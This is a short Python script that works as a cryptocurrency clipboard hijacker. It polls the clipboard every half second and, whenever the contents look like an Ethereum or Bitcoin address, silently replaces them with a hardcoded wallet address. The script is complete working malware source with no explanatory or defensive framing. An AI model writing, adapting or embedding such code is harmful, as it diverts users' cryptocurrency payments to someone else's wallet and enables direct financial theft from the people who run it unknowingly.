import re
import time
import clipboard

while True:
    contents = clipboard.paste()
    if re.fullmatch(r'0x[0-9a-fA-F]{40}', contents):
        clipboard.copy('0x91e5B37e4dB27a893F4B59E20e265c7086B414c9')
    if re.fullmatch(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', contents):
        clipboard.copy('1BoatSLRHtKNngkdXEeobR76b53LETtpyT')
    time.sleep(0.5)
